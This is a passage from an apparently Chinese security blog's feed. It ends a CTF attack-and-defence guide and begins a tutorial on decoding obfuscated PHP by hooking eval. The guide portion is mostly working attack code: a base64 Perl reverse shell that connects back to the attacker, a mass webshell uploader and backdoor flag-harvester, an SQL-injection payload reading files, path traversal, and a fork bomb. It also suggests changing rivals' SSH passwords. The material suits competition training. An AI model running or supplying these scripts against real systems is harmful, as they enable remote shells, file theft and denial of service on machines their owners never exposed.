class="string">'c'</span>); </span><br><span class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </span><br><span class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>. </span><br><span class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>. </span><br><span class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>. </span><br><span class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>. </span><br><span class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>. </span><br><span class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>; </span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect); </span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后本地执行<code>nc -lp 9999</code>即可</p><p>6.获取flag的方式</p><p>(1) 批量传webshell(shell的内容可以写为权限维持部分的那个脚本)，之后结合批量访问 参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="noopener">PHP-定时任务</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考 http://www.freebuf.com/sectool/91082.html</span></span><br><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="comment">#coding=utf-8  </span></span><br><span class="line">  </span><br><span class="line">import urllib  </span><br><span class="line">import urllib2</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">  </span><br><span class="line">def post(url, data):  </span><br><span class="line">    req = urllib2.Request(url)  </span><br><span class="line">    data = urllib.urlencode(data)   </span><br><span class="line">    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  </span><br><span class="line">    response = opener.open(req, data)  </span><br><span class="line">    <span class="built_in">return</span> response.read()  </span><br><span class="line"></span><br><span class="line">def get_shell_path(posturl,passwd):</span><br><span class="line">    shell_path = <span class="string">""</span></span><br><span class="line">    try:</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></span><br><span class="line">        data[<span class="string">'z0'</span>]=<span class="string">'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'</span></span><br><span class="line">        shell_path = post(posturl, data).strip()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    <span class="built_in">return</span> shell_path</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'</span></span><br><span class="line">    shellfile = sys.argv[1] <span class="comment"># 存放webshell路径和密码的文件</span></span><br><span class="line">    localfile = sys.argv[2] <span class="comment"># 本地待上传的文件名</span></span><br><span class="line">    shell_file = open(shellfile,<span class="string">'rb'</span>)</span><br><span class="line">    local_content = str(open(localfile,<span class="string">'rb'</span>).<span class="built_in">read</span>())</span><br><span class="line">    <span class="keyword">for</span> eachline <span class="keyword">in</span> shell_file:</span><br><span class="line">        posturl = eachline.split(<span class="string">','</span>)[0].strip()</span><br><span class="line">        passwd = eachline.split(<span class="string">','</span>)[1].strip()</span><br><span class="line">        try:</span><br><span class="line">            reg = <span class="string">".*/([^/]*\.php?)"</span></span><br><span class="line">            match_shell_name = re.search(reg,eachline)</span><br><span class="line">            <span class="keyword">if</span> match_shell_name:</span><br><span class="line">                shell_name=match_shell_name.group(1)</span><br><span class="line">                shell_path = get_shell_path(posturl,passwd).strip()</span><br><span class="line">                target_path = shell_path.split(shell_name)[0]+localfile</span><br><span class="line">                target_path_base64 = base64.b64encode(target_path)</span><br><span class="line">                target_file_url = eachline.split(shell_name)[0]+localfile</span><br><span class="line">                data = &#123;&#125;</span><br><span class="line">                data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></span><br><span class="line">                data[<span class="string">'z0'</span>]=<span class="string">'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'</span></span><br><span class="line">                data[<span class="string">'z1'</span>]=target_path_base64</span><br><span class="line">                data[<span class="string">'z2'</span>]=base64.b64encode(local_content)</span><br><span class="line">                response = post(posturl, data)</span><br><span class="line">                <span class="keyword">if</span> response:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">'[+] '</span>+target_file_url+<span class="string">', upload succeed!'</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">'[-] '</span>+target_file_url+<span class="string">', upload failed!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', unsupported webshell!'</span></span><br><span class="line">        except Exception,e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', connection failed!'</span></span><br><span class="line">    shell_file.close()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>(2) 或者直接执行下面的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">flag=$(curl <span class="string">'http://172.16.4.42:800'</span>)</span><br><span class="line">curl --cookie <span class="string">"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD"</span> --data <span class="string">"key="</span><span class="variable">$&#123;flag&#125;</span> <span class="string">"http://172.16.4.42/index.php/wargame/submit"</span></span><br><span class="line">sleep 1s</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>(3) 有些SQL注入漏洞可以通过sqlmap利用—sql-shell 执行<code>select load_file(&#39;/flag&#39;)</code>来获取flag。最好直接利用脚本来获得。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> sess_admin</span><br><span class="line">    data = &#123;<span class="string">"section_name"</span>:<span class="string">"asd"</span>,<span class="string">"admin_name"</span>:<span class="string">"'||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'"</span>,<span class="string">"announcement"</span>:<span class="string">"asd"</span>&#125;</span><br><span class="line">    r = sess_admin.post(<span class="string">'http://%s/index.php/section/add'</span>%host,data=data)</span><br><span class="line">    flags = re.findall(<span class="string">r'~(.+?)~'</span>,r.content)</span><br><span class="line">    <span class="keyword">if</span> flags:</span><br><span class="line">        <span class="keyword">return</span> flags[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error pwn!"</span></span><br></pre></td></tr></table></figure><p>(4) 文件包含漏洞，直接可以通过../../../../../../flag的方式获取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def include(host):</span><br><span class="line">    r = requests.get(url=<span class="string">"http://%s/?t=../../../../../../flag"</span>%host)</span><br><span class="line">    flags = re.findall(r<span class="string">'^(.+?)&lt;'</span>,r.content)</span><br><span class="line">    <span class="keyword">if</span> flags:</span><br><span class="line">        <span class="built_in">return</span> flags[0]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"error pwn!"</span></span><br></pre></td></tr></table></figure><p>(5)批量提交flag的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line">server_host = <span class="string">'10.10.0.2'</span></span><br><span class="line">server_port = <span class="number">80</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'team token or flag not found'</span>)</span><br><span class="line">    conn = httplib.HTTPConnection(host, port, timeout=timeout)</span><br><span class="line">    params = urllib.urlencode(&#123;</span><br><span class="line">        <span class="string">'token'</span>: team_token,</span><br><span class="line">        <span class="string">'flag'</span>: flag,</span><br><span class="line">    &#125;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/api/submit_flag'</span>, params, headers)</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    data = response.read()</span><br><span class="line">    <span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'usage: ./submitflag.py $team_token $flag'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    host = server_host</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>7.批量修改ssh密码的脚本(猥琐流直接干掉几个对手)</p><p>8.如果有发现有预留后门，要立即使用脚本进行获取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://192.168.71."</span></span><br><span class="line">url1=<span class="string">""</span></span><br><span class="line">shell=<span class="string">"/Upload/index.php"</span></span><br><span class="line">passwd=<span class="string">"abcde10db05bd4f6a24c94d7edde441d18545"</span> </span><br><span class="line">port=<span class="string">"80"</span></span><br><span class="line">payload = &#123;passwd: <span class="string">'system(\'cat /flag\');'</span>&#125;</span><br><span class="line">f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>) </span><br><span class="line">f1=open(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]: </span><br><span class="line">    url1=url+str(i)+<span class="string">":"</span>+port+shell</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">print</span> url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"shell 404"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> url1+<span class="string">" connect shell fail"</span></span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>9.自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用。</p><p>10.fork炸弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考: https://linux.cn/article-5685-1-rss.html</span></span><br><span class="line">:()&#123;:|:&amp;&#125;;:</span><br></pre></td></tr></table></figure><h3 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h3><ul><li><a href="https://xianzhi.aliyun.com/forum/topic/1530/" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/1530</a></li><li><a href="http://bobao.360.cn/ctf/learning/210.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/210.html</a></li><li><a href="https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg</a></li><li><a href="https://www.t00ls.net/viewthread.php?tid=34681" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=34681</a></li><li><a href="http://rcoil.me/2017/06/CTF" target="_blank" rel="noopener">http://rcoil.me/2017/06/CTF线下赛总结</a></li><li><a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560" target="_blank" rel="noopener">https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560</a></li><li><a href="http://www.freebuf.com/articles/web/118149.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/118149.html</a></li><li><a href="https://www.secpulse.com/archives/38622.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/38622.html</a></li><li><a href="http://bobao.360.cn/ctf/detail/169.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/169.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-AWD模式&quot;&gt;&lt;a href=&quot;#0x01-AWD模式&quot; class=&quot;headerlink&quot; title=&quot;0x01 AWD模式&quot;&gt;&lt;/a&gt;0x01 AWD模式&lt;/h3&gt;&lt;p&gt;Attack With Defence，简而言之就是你既是一个hacker，
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>解密混淆的PHP代码</title>
    <link href="http://zer0yu.github.io/2018/05/23/decode-garble-phpcode/"/>
    <id>http://zer0yu.github.io/2018/05/23/decode-garble-phpcode/</id>
    <published>2018-05-23T09:06:48.000Z</published>
    <updated>2018-05-23T12:37:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>###0x00 前言</p><p>被混淆PHP代码见的很多了，但以前比较懒总是用扩展直接decode掉，最近就想手动操作下看看不使用扩展怎么进行解密。</p><h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>一般来说PHP的混淆都会通过多次<code>eval</code>来还原并执行php代码，所以我们可以通过hook PHP的<code>eval</code>函数来打印其参数来解密代码。</p><h3 id="0x02-环境配置"><a href="#0x02-环境配置" class="headerlink" title="0x02 环境配置"></a>0x02 环境配置</h3><p>OS: ubuntu 18.04</p><p>PHP: 5.6.36</p><p>首先要安装PHP，此处安装的版本为5.6.36</p><p>1.安装相关的依赖库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libxml2-dev build-essential openssl libssl-dev make curl  libcurl4-gnutls-dev libjpeg-dev libpng-dev libtool-bin bison php-fpm</span><br></pre></td></tr></table></figure><p>2.编译安装libiconv</p><p>在<a href="http://www.gnu.org/software/libiconv/#TOCdownloading" target="_blank" rel="noopener">libiconv官网</a>下载压缩包，放到<code>/usr/local/src</code>下，解压，编译安装，这里下载的是<code>libiconv-1.15.tar.gz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf libiconv-1.15.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libiconv-1.15</span><br><span class="line">sudo ./configure --prefix=/usr/<span class="built_in">local</span></span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig // 刷新动态链接库缓存</span><br></pre></td></tr></table></figure><p>注意，这里是将<code>libiconv</code>安装到了系统默认的<code>lib</code>目录下，安装路径<code>/usr/local</code>不可随意更改，否则后面会出现编译错误。另外，执行<code>sudo make</code>之后会有如下warning</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">warning: remember too run &apos;libtool --finish /usr/local/lib&apos;</span><br></pre></td></tr></table></figure><p>按照warning的提示执行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libtool --finish /usr/local/lib</span><br></pre></td></tr></table></figure><p>3.编译安装PHP</p><p>去<a href="http://php.net/" target="_blank" rel="noopener">PHP官网</a>下载<code>php5.6.36</code>压缩包放到<code>/usr/local/src</code>下，解压，编译安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf php-5.6.36.tar.gz</span><br><span class="line"><span class="built_in">cd</span> php-5.6.36</span><br><span class="line"><span class="comment">#由于我们后面要进行调试，所以要在编译时加上-g参数，加调试符号</span></span><br><span class="line">sudo ./configure CFLAGS=<span class="string">"-g"</span> CXXFLAGS=<span class="string">"-g"</span></span><br><span class="line">sudo make ZEND_EXTRA_LIBS=<span class="string">'-liconv'</span> -j16</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>4.补充下扩展的编译安装</p><p>在此处以zlib的编译安装为例，由于我们的PHP是编译安装的，所以在路径<code>php-5.6.36/ext/zlib/</code>下就有所需要的文件。如果要安装的扩展在php源码ext目录中没有，可以从<a href="http://pecl.php.net/" target="_blank" rel="noopener">PECL</a>上搜索你需要的扩展进行编译安装。</p><p>1.在对应的扩展目录运行<code>phpize</code>命令(如果没有提示autoconf记得apt安装)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ phpize </span><br><span class="line">Configuring <span class="keyword">for</span>:</span><br><span class="line">PHP Api Version:         20131106</span><br><span class="line">Zend Module Api No:      20131226</span><br><span class="line">Zend Extension Api No:   220131226</span><br></pre></td></tr></table></figure><p>2.运行<code>configure</code>命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ ./configure</span><br><span class="line">checking <span class="keyword">for</span> grep that handles long lines and -e... /bin/grep</span><br><span class="line">checking <span class="keyword">for</span> egrep... /bin/grep -E</span><br></pre></td></tr></table></figure><p>3.运行<code>make</code>命令(之后可以运行也可以不运行make test)</p><p>4.运行<code>make install</code>命令</p><p>5.配置ini文件</p><p>通过运行 <code>php --ini</code>查找php.ini文件位置，然后在文件中添加<code>extension=zlib.so</code></p><p>通过编译安装的PHP是没有php.ini文件的，但是可以通过<code>php --ini</code>查看配置文件的路径，例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --ini</span><br><span class="line">Configuration File (php.ini) Path: /usr/<span class="built_in">local</span>/lib</span><br><span class="line">Loaded Configuration File:         (none)</span><br><span class="line">Scan <span class="keyword">for</span> additional .ini files <span class="keyword">in</span>: (none)</span><br><span class="line">Additional .ini files parsed:      (none)</span><br></pre></td></tr></table></figure><p>可以看到此时Configuration File显示的是none。这种情况你只需要将之前在PHP官网下载的PHP文件中的php.ini拷贝一份到Configuration File (php.ini) Path路径下就可以了。操作完之后再执行<code>php --ini</code>可以看到如下显示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ php --ini</span><br><span class="line">Configuration File (php.ini) Path: /usr/local/lib</span><br><span class="line">Loaded Configuration File:         /usr/local/lib/php.ini</span><br><span class="line">Scan for additional .ini files in: (none)</span><br><span class="line">Additional .ini files parsed:      (none)</span><br></pre></td></tr></table></figure><h3 id="0x03-开始Hook"><a href="#0x03-开始Hook" class="headerlink" title="0x03 开始Hook"></a>0x03 开始Hook</h3><p>PHP中的eval函数在Zend里需要调用<code>zend_compile_string</code>函数，我们先看下<code>zend_compile_string</code>函数的位置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/Zend$ grep -rn <span class="string">"zend_compile_string"</span> *</span><br><span class="line">Binary file zend_alloc.o matches</span><br><span class="line">Binary file zend_API.o matches</span><br><span class="line">Binary file zend_ast.o matches</span><br><span class="line">Binary file zend_builtin_functions.o matches</span><br><span class="line">zend.c:693:zend_compile_string = compile_string;</span><br><span class="line">Binary file zend_closures.o matches</span><br><span class="line">zend_compile.c:98:ZEND_API zend_op_array *(*zend_compile_string)(zval *source_string, char *filename TSRMLS_DC);</span><br></pre></td></tr></table></figure><p>我们发现<code>zend_compile_string</code>函数其实就是<code>compile_string</code>函数。所以我在这儿测试一个前几天偶然间得到的被混淆的PHP代码，如下所示可以看到在<code>compile_string</code>中已经获取到<code>eval</code>参数的值。</p><p>我们可以看到程序断下来后，<code>compile_string</code>的第一个参数<code>source_string</code>为php代码中<code>eval</code>函数的参数在Zend中的结构——即<code>zval_struct</code>。<code>source_string.value.str.val</code>即为参数的字符串形式。所以之后修改修改<code>compile_string</code>函数来打印<code>eval</code>的参数就可以得到解密后的代码了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 